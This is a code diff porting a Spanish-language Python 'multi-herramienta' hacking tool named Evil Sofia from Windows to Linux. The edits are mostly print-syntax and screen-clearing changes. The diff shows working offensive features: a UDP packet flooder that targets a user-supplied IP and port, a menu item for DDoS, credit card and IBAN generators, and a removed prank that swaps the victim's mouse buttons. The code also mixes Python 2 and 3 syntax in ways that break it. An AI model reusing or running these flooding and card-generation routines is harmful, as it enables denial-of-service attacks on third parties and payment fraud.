@@ -2,26 +2,32 @@
 import re
 import time 
 from random import choice
+import os
 import sys
 
 
-vrs = ' Windows Edition'
+def cls():
+	linux = 'clear'
+	windows = 'cls'
+	os.system([linux, windows][os.name == 'nt'])
 
+
+vrs = ('MPF VERSION\n')
 time.sleep(0.5)
 import os
 try:
  import requests
 except:
-  print" Installing requests Module"
+  print(" Installing requests Module")
   if os.name=='nt':
     try:
       os.system('C:\Python27\Scripts\pip2.exe install requests')
     except:
-      print "Install Python-Pip Sir"
+      print ("Install Python-Pip Sir")
       raw_input('')
   else:
     os.system('pip2 install requests')
-msg001 = """
+msg001 = ("""
                                      _       
                                     | |      
   ___ __ _ _ __ __ _  __ _ _ __   __| | ___  
@@ -30,26 +36,18 @@ msg001 = """
  \___\__,_|_|  \__, |\__,_|_| |_|\__,_|\___/ 
                 __/ |                        
                |___/                         
-"""
+""")
 print(msg001)
 msg00 = "OOO\n"
 for i in msg00:
         sys.stdout.write(i)
         sys.stdout.flush()
-        time.sleep(0.3)
+        time.sleep(0.5)
 
 vers=requests.get('https://pastebin.com/raw/0pqX38U3').text.encode('utf-8')
 
-#potasio=requests.get('https://pastebin.com/raw/UyhX5Pjt').text.encode('utf-8')
-"""
-ms0g ="Checking Your Version (%s) "%vers
-for i in ms0g:
-        sys.stdout.write(i)
-        sys.stdout.flush()
-        time.sleep(0.02)
-"""
-if vers=="4.1.1":
-    pass
+if vers=="4.3.8":
+  print('[>] Good You have last version \n')
 else:
  print("There is New Version available !! Do you Want To Update Your tool ? ")
  ok=raw_input('''
@@ -63,7 +61,7 @@ else:
    sys.stdout.flush()
    time.sleep(0.02)
   os.remove(sys.argv[0])
-  os.system('start https://github.com/emiliobog/Evil-Sofia')
+  os.system('git clone https://github.com/emiliobog/Evil-Sofia-Linux')
   exit()
   if os.name=='nt':
    os.system('cls')
@@ -72,33 +70,42 @@ else:
   os.system('LSofia.py')
  elif ok=='no':
   pass
-ax = os.system 
-ax("cls")
-ax("color 4 ")
+
+
+ax = os.system
+cls()
+
 ols = time.strftime("%H:%M:%S")
 print time.strftime("                    %I:%M:%S") 
 if ols > "23:30":
-    print "EVIL SOFIA ESTA REFRESCANDO!..."
-    os.system("start http://lh6.googleusercontent.com/-AXuIH_cHGOQ/UUzEKLtQ0EI/AAAAAAAAAGI/jw2FhilfMo4/s298-no/TrollFaceDancing_large.gif")
-    os.system("Rundll32 user32,SwapMouseButton")
+    print ("EVIL SOFIA ESTA REFRESCANDO!...")
+    print("CODIFICADO EN: ")
+    print ('''
+                _
+        ,--(_)         @               @
+      _/ ;-. \    @  @ @,m. @  @ ,mm. m@m  @  @
+     (_)(   )-)   @  @ @  8 @  @ @  @  @   @  @
+       \ ;-'_/    `""' `""' `""' "  "  `"" `""'
+ -BOG-  `--(_)
+''')
+
     exit()
 else:
-    print " "
-#https://github.com/emiliobog/Evil-Sofia
+    print (" ")
 
-print ''' 
+print ('''
     ___ _   _  _ _      __   __  ___ _  __   
    | __| \ / || | |   /' _/ /__\| __| |/  \  
    | _|`\ V /'| | |_  `._`.| \/ | _|| | /\ | 
    |___| \_/  |_|___| |___/ \__/|_| |_|_||_|  
-'''
+''')
 time.sleep(1.4)
-ax("title EVIL SOFIA")
-print "         Emmanuel Milos" + "|" + "Emilio Barroso"
-print "              ~MULTI-HERRAMIENTA~" 
-print '''
+#ax("title EVIL SOFIA")
+print ("         Emmanuel Milos" + "|" + "Emilio Barroso")
+print ("              ~MULTI-HERRAMIENTA~")
+print ('''
   
-'''
+''')
 
 while True:
     print("      .:MENU:.")
@@ -112,7 +119,7 @@ while True:
     print("   8.HOST TO IP")
     print("   9.STEAD - DDOS (LVL 4)")
     print("   10.CCGEN")
-    print("   11.PORT SCANNER")
+    print("   11.PORT SCANNER ")
     print("   99.Salir")
     print("")
     opc = input("  Digite el numero de la opcion: ")
@@ -174,11 +181,11 @@ while True:
         import time
         
         from random import randint
-        os.system("title LAST")
-        os.system("cls")
-        os.system("color 4")
+        
+        cls()
+        
         print time.strftime("               %I:%M:%S")
-        print'''
+        print('''
     
 $$\        $$$$$$+   $$$$$$\ $$$$$$$$\ 
 $$ |      $$  __$$\ $$  __$$\\__$$  __|
@@ -190,7 +197,7 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
 \________|\__|  \__| \______/   \__|   
                                        
                                                                  
-            '''
+            ''')
         dni=range(1,9)
         print("   Emmanuel Milos|Emilio Barroso")
 
@@ -221,15 +228,15 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
             resto = intnumero%23
 
             letra = letra1[resto]
-            print '   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%'
+            print ('   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%')
             print '   %        ' + numero,  "-", letra + '       %'
-            print'   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%'
-            print " "
+            print('   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%')
+            print (" ")
 
         ra()
 
         raw_input("Presiona Enter Para Salir De El Gen")
-        os.system("color 0")
+        
     elif opc==3: 
         import socket
         import random
@@ -246,20 +253,20 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
         bytes = random._urandom(1490)
         #############
 
-        os.system("cls")
-        print '''
+        cls()
+        print ('''
  _  _  _  __    _ ______ _  __   
 | \| \/ \(_    |_| |  | |_|/  |/ 
 |_/|_/\_/__)   | | |  | | |\__|\ 
                                                               
-        '''
+        ''')
         ip = raw_input("IP Target : ")
         port = input("Port       : ")
 
-        os.system("clear")
+        cls()
         os.system("echo INICIANDO ATAQUE! ")
         
-        limonja= "[====================] 100%"
+        limonja= ("[====================] 100%")
         for i in limonja:
             sys.stdout.write(i)
             sys.stdout.flush()
@@ -270,7 +277,7 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
              sock.sendto(bytes, (ip,port))
              sent = sent + 1
              port = port + 1
-             print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+             print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
              if port == 65534:
                 port = 1
                 break;
@@ -289,10 +296,10 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
         || || |_) / ___ \| |\  |_____| |_| | |___| |\  |
         |___|____/_/   \_\_| \_|      \____|_____|_| \_|                                               
         [$] BOG IBAN GEN/VALIDATOR.
-        [$] https://www.boghacking.com/
+        [$] https://www.Bogpro.com/
         '''
 
-        print logs1
+        print (logs1)
         print '[X] ESCOGE EL PAIS [GERMANY[DE]/FRANCE[FR]/SPAIN[ES]/ITALIA[IT]].'
         print ''
 
@@ -370,16 +377,16 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
             # //OUT PUT
             print '[*]  PORFAVOR ESCRIBE UN PAIS O CODIGO DE PAIS VALIDO.'
     elif opc==5:
-        ax("cls")
-        print '   OTRAS HERRMAIENTAS'
-        print '      <<_MENU_>>'
-        print""
-        print '11 - ENCRIPTADOR DE PALABRAS'
+        cls()
+        print ('   OTRAS HERRMAIENTAS')
+        print ('      <<_MENU_>>')
+        print("")
+        print ('11 - ENCRIPTADOR DE PALABRAS')
         time.sleep(5)
 
         othert = int(input("DIGITE LA OPCION: "))
         if othert == 11:
-            print "BOG SECURITY"
+            print ("BOG SECURITY")
             print("")
             texto =  "hola "
             opcion= 0
@@ -449,7 +456,7 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
                 print "mensaje cifrado: ",invertir(encoding)
                 print "su clave es:", clave
                 time.sleep(10)
-                ax("cls")
+                ax("clear")
             if opcion == 2:
  
                 print"opcion de desencriptacion"
@@ -507,7 +514,7 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
         import random
         import os, sys, smtplib, getpass
         def logo():
-                os.system("cls")
+                cls()
                 print '''
              o
              X
@@ -618,6 +625,7 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
             #BOG()
         BOG()
     elif opc==9:
+        botella = 0 
         print '''
  SSS  TTTTTT EEEE  AA  DDD  
 S       TT   E    A  A D  D 
@@ -645,9 +653,10 @@ SSSS    TT   EEEE A  A DDD'''
                 print('EL SERVER TIENE PROTECCION CONTRA ESTE DDOS') 
             else:
                 print("PAQUETE ENVIADO CORRECTAMENTE")
+               
+                print(botella)
                 function()
         function()
-
     elif opc==10:
         from random import *
         from time import sleep
@@ -693,7 +702,7 @@ SSSS    TT   EEEE A  A DDD'''
         remoteServer    = raw_input("HOST A ESCANEAR: : ")
         remoteServerIP  = socket.gethostbyname(remoteServer)
         print "-" * 60
-        print "ESPERA, ESCANEANDO HOST REMODTO: ", remoteServerIP
+        print "ESPERA, ESCANEANDO HOST REMOTO: ", remoteServerIP
         print "-" * 60
 
 
@@ -720,12 +729,13 @@ SSSS    TT   EEEE A  A DDD'''
         t2 = datetime.now()
         total =  t2 - t1
         print 'Scanning Completed in: ', total
+    elif opc==123:
+        print("BoG - TECH")
     elif opc==99:
-        pris = "Gracias Por Utlizar Evil_SOFIA.  VERSION:" + vrs
+        pris = "Gracias Por Utlizar Evil_SOFIA.  VERSION:" + vrs 
         for i in pris:
          sys.stdout.write(i)
          sys.stdout.flush()
          time.sleep(0.02)
-        break;
+        break
         exit()
-    
